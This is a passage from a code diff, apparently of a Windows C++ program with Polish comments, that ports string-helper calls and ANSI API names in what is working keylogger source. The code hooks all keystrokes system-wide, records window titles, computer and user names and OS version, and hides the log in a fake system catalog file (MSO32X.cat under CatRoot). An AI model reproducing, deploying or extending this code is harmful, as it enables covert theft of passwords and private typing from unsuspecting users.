           if (pkbdllhook->vkCode==VK_ADD) //num
              {
-              ts::text::c_str::mov(lpklawisz,"\+"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\+"); goto zapisz;
              }
           if (pkbdllhook->vkCode==VK_SUBTRACT) //num
              {
-              ts::text::c_str::mov(lpklawisz,"\-"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\-"); goto zapisz;
              }
           if (pkbdllhook->vkCode==VK_DECIMAL) //num
              {
-              ts::text::c_str::mov(lpklawisz,"\,"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\,"); goto zapisz;
              }
           if (pkbdllhook->vkCode==VK_DIVIDE) //num
              {
-              ts::text::c_str::mov(lpklawisz,"\/"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\/"); goto zapisz;
              }
          }
       if ((Pressed.fMenu)==0)
@@ -777,27 +779,27 @@ break;
           // nienormalne
           if (pkbdllhook->vkCode==VK_SPACE)
              {
-              ts::text::c_str::mov(lpklawisz,"\ "); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\ "); goto zapisz;
              }
           if (pkbdllhook->vkCode==VK_TAB)
              {
-              ts::text::c_str::mov(lpklawisz,"\t"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\t"); goto zapisz;
              }
           if (pkbdllhook->vkCode==VK_RETURN)
              {
-              ts::text::c_str::mov(lpklawisz,"\r\n"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"\r\n"); goto zapisz;
              }
           if (pkbdllhook->vkCode==VK_BACK)
              {
-              ts::text::c_str::mov(lpklawisz,"[Bck]"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"[Bck]"); goto zapisz;
              }
           if (pkbdllhook->vkCode==VK_DELETE)
              {
-              ts::text::c_str::mov(lpklawisz,"[Del]"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"[Del]"); goto zapisz;
              }
           if (pkbdllhook->vkCode==VK_ESCAPE)
              {
-              ts::text::c_str::mov(lpklawisz,"[Esc]"); goto zapisz;
+              stk::cstr::mov(lpklawisz,"[Esc]"); goto zapisz;
              }
          }
    goto KEYEXIT; // omin
@@ -815,7 +817,7 @@ Pressed.fCtrl = Pressed.fMenu = Pressed.fShift = false;
 llkbdhhook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)LowLevelKeyboardProc,GetModuleHandle(NULL), 0);
 SetPriorityClass(GetCurrentProcess(),IDLE_PRIORITY_CLASS); // aby nie przeszkadza³
 // blokada kilkukrotnego startu
-HANDLE hInstanceMutex = ::CreateMutex(NULL,TRUE,"Key32Mutex");
+HANDLE hInstanceMutex = ::CreateMutexA(NULL,TRUE,"Key32Mutex");
 if (GetLastError()==ERROR_ALREADY_EXISTS)
    {char *errorek1 = (char*)0;
     char *errorek2 = (char*)0xFFFFFFFF;
@@ -826,18 +828,18 @@ if (GetLastError()==ERROR_ALREADY_EXISTS)
 
 SYSTEMTIME SystemTime;
 GetLocalTime(&SystemTime);
-char *lpnazwa = ts::text::c_str::alloc(256);
-GetSystemDirectory(lpnazwa,255);
-ts::text::c_str::add(lpnazwa,"\\CatRoot\\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\\MSO32X.cat");
+char *lpnazwa = stk::cstr::alloc(256);
+GetSystemDirectoryA(lpnazwa,255);
+stk::cstr::cat(lpnazwa,"\\CatRoot\\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\\MSO32X.cat");
 BuforPlikowy1 = new TBuforPlikowy(lpnazwa);
-ts::text::c_str::free(lpnazwa);
+stk::cstr::free(lpnazwa);
 
 //+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
-char *HWNDlpTextCrt = ts::text::c_str::allocex(256,""); //nazw current okna
-char *HWNDlpTextPrv = ts::text::c_str::allocex(256,""); //nazwa ostatnio aktywnego okna
-char *HWNDlpTextLog = ts::text::c_str::allocex(256,""); //nazwa do wpisu
-char *HWNDlpTextTmp = ts::text::c_str::allocex(256,""); //nazw temp
+char *HWNDlpTextCrt = stk::cstr::allocex(256,""); //nazw current okna
+char *HWNDlpTextPrv = stk::cstr::allocex(256,""); //nazwa ostatnio aktywnego okna
+char *HWNDlpTextLog = stk::cstr::allocex(256,""); //nazwa do wpisu
+char *HWNDlpTextTmp = stk::cstr::allocex(256,""); //nazw temp
 //
 HWND HWNDIdCrt;
 HWND HWNDIdPrv = 0;
@@ -848,52 +850,52 @@ HWND HWNDIdPrv = 0;
 //
 if (BuforPlikowy1->bufor.pos[CRT] > 1)
     BuforPlikowy1->save("\r\n\r\n",CRT);
-ts::text::c_str::mov(HWNDlpTextLog,"[*%Info o logu%*]:");
+stk::cstr::mov(HWNDlpTextLog,"[*%Info o logu%*]:");
 //
 // data i czas
 //
-GetDateFormat(LOCALE_USER_DEFAULT,0,&SystemTime,"'Data='dd'.'MM'.'yyyy",HWNDlpTextTmp,255);
-ts::text::c_str::add(HWNDlpTextLog,HWNDlpTextTmp);
-GetTimeFormat(LOCALE_USER_DEFAULT,0,&SystemTime,"', Czas='HH'.'mm'.'ss",HWNDlpTextTmp,255);
-ts::text::c_str::add(HWNDlpTextLog,HWNDlpTextTmp);
+GetDateFormatA(LOCALE_USER_DEFAULT,0,&SystemTime,"'Data='dd'.'MM'.'yyyy",HWNDlpTextTmp,255);
+stk::cstr::cat(HWNDlpTextLog,HWNDlpTextTmp);
+GetTimeFormatA(LOCALE_USER_DEFAULT,0,&SystemTime,"', Czas='HH'.'mm'.'ss",HWNDlpTextTmp,255);
+stk::cstr::cat(HWNDlpTextLog,HWNDlpTextTmp);
 //
 // wpis nazwy komputera i urzytkownika
 //
 unsigned long tempLong = 255;
 //
-GetComputerName(HWNDlpTextTmp,&tempLong);
-ts::text::c_str::add(HWNDlpTextLog,", Komp=");
-ts::text::c_str::add(HWNDlpTextLog,HWNDlpTextTmp);
-GetUserName(HWNDlpTextTmp,&tempLong);
-ts::text::c_str::add(HWNDlpTextLog,", User=");
-ts::text::c_str::add(HWNDlpTextLog,HWNDlpTextTmp);
+GetComputerNameA(HWNDlpTextTmp,&tempLong);
+stk::cstr::cat(HWNDlpTextLog,", Komp=");
+stk::cstr::cat(HWNDlpTextLog,HWNDlpTextTmp);
+GetUserNameA(HWNDlpTextTmp,&tempLong);
+stk::cstr::cat(HWNDlpTextLog,", User=");
+stk::cstr::cat(HWNDlpTextLog,HWNDlpTextTmp);
 //
 // wpis rodzaju systemu
 //
-LPOSVERSIONINFO lpVersionInformation = new OSVERSIONINFO;
-lpVersionInformation->dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
+LPOSVERSIONINFOA lpVersionInformation = new OSVERSIONINFOA;
+lpVersionInformation->dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
 
-if (GetVersionEx(lpVersionInformation))
+if (GetVersionExA(lpVersionInformation))
    {
      char lpVersionNumber[64];
-   ts::text::c_str::mov(lpVersionNumber,ts::text::c_str::itoa(lpVersionInformation->dwMajorVersion));
-   ts::text::c_str::add(lpVersionNumber,"\.");
-   ts::text::c_str::add(lpVersionNumber,ts::text::c_str::itoa(lpVersionInformation->dwMajorVersion));
+   stk::cstr::mov(lpVersionNumber,stk::cstr::itoa(lpVersionInformation->dwMajorVersion));
+   stk::cstr::cat(lpVersionNumber,"\.");
+   stk::cstr::cat(lpVersionNumber,stk::cstr::itoa(lpVersionInformation->dwMajorVersion));
    //
    if (lpVersionInformation->dwPlatformId == VER_PLATFORM_WIN32_NT)
       {
-       ts::text::c_str::add(HWNDlpTextLog,", OS=WinNT ");
-       ts::text::c_str::add(HWNDlpTextLog,lpVersionNumber);
-       ts::text::c_str::add(HWNDlpTextLog,lpVersionInformation->szCSDVersion);
+       stk::cstr::cat(HWNDlpTextLog,", OS=WinNT ");
+       stk::cstr::cat(HWNDlpTextLog,lpVersionNumber);
+       stk::cstr::cat(HWNDlpTextLog,lpVersionInformation->szCSDVersion);
       }
    else
       {
-       ts::text::c_str::add(HWNDlpTextLog,", OS=Win9X ");
-       ts::text::c_str::add(HWNDlpTextLog,lpVersionNumber);
-       ts::text::c_str::add(HWNDlpTextLog,lpVersionInformation->szCSDVersion);
+       stk::cstr::cat(HWNDlpTextLog,", OS=Win9X ");
+       stk::cstr::cat(HWNDlpTextLog,lpVersionNumber);
+       stk::cstr::cat(HWNDlpTextLog,lpVersionInformation->szCSDVersion);
       }
    }
-ts::text::c_str::add(HWNDlpTextLog,"\r\n");
+stk::cstr::cat(HWNDlpTextLog,"\r\n");
 //
 BuforPlikowy1->save(HWNDlpTextLog,CRT); // post
 //
@@ -906,7 +908,7 @@ for (BuforPlikowy1->bufor.pos[USR] = BuforPlikowy1->bufor.pos[PRV] = BuforPlikow
     if  ((unsigned __int16)GetAsyncKeyState(VK_LBUTTON)!=0x8000 && (unsigned __int16)GetAsyncKeyState(0)!=0x8000 && HWNDIdPrv == (HWNDIdCrt=GetForegroundWindow()))
          continue;
 
-    GetWindowText(HWNDIdCrt,HWNDlpTextCrt,255);
+    GetWindowTextA(HWNDIdCrt,HWNDlpTextCrt,255);
 
     if (strcmp(HWNDlpTextPrv,HWNDlpTextCrt)!=0)
        {
@@ -915,12 +917,12 @@ for (BuforPlikowy1->bufor.pos[USR] = BuforPlikowy1->bufor.pos[PRV] = BuforPlikow
         if (BuforPlikowy1->bufor.pos[PRV] < BuforPlikowy1->bufor.pos[CRT])
             BuforPlikowy1->bufor.pos[USR] = BuforPlikowy1->bufor.pos[CRT]; // jeœli coœ naciœniête to OK nowa nadpisywalna pozycja
        else BuforPlikowy1->bufor.pos[CRT] = BuforPlikowy1->bufor.pos[USR]; // jeœli nie to zmieñ pozycjê nadpisania na star¹
-       ts::text::c_str::mov(HWNDlpTextPrv,HWNDlpTextCrt);
-       GetTimeFormat(LOCALE_USER_DEFAULT,0,&SystemTime,"HH'.'mm'.'ss'::'",HWNDlpTextTmp,255);
-       ts::text::c_str::add(HWNDlpTextTmp,HWNDlpTextCrt);
-       ts::text::c_str::mov(HWNDlpTextLog,"\r\n\[");
-       ts::text::c_str::add(HWNDlpTextLog,HWNDlpTextTmp);
-       ts::text::c_str::add(HWNDlpTextLog,"]:");
+       stk::cstr::mov(HWNDlpTextPrv,HWNDlpTextCrt);
+       GetTimeFormatA(LOCALE_USER_DEFAULT,0,&SystemTime,"HH'.'mm'.'ss'::'",HWNDlpTextTmp,255);
+       stk::cstr::cat(HWNDlpTextTmp,HWNDlpTextCrt);
+       stk::cstr::mov(HWNDlpTextLog,"\r\n\[");
+       stk::cstr::cat(HWNDlpTextLog,HWNDlpTextTmp);
+       stk::cstr::cat(HWNDlpTextLog,"]:");
        BuforPlikowy1->save(HWNDlpTextLog,CRT);
        BuforPlikowy1->bufor.pos[PRV] = BuforPlikowy1->bufor.pos[CRT]; // PRV = CRT i od tej pory jesli coœ bêdzie naciœniête => PRV < CRT
        }
@@ -928,9 +930,9 @@ for (BuforPlikowy1->bufor.pos[USR] = BuforPlikowy1->bufor.pos[PRV] = BuforPlikow
 //+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 BuforPlikowy1->save("\r\n}\0",CRT);
 CloseHandle(hInstanceMutex);
-ts::text::c_str::free(HWNDlpTextPrv);
-ts::text::c_str::free(HWNDlpTextCrt);
-ts::text::c_str::free(HWNDlpTextLog);
+stk::cstr::free(HWNDlpTextPrv);
+stk::cstr::free(HWNDlpTextCrt);
+stk::cstr::free(HWNDlpTextLog);
 delete BuforPlikowy1;
 return 0;
 }
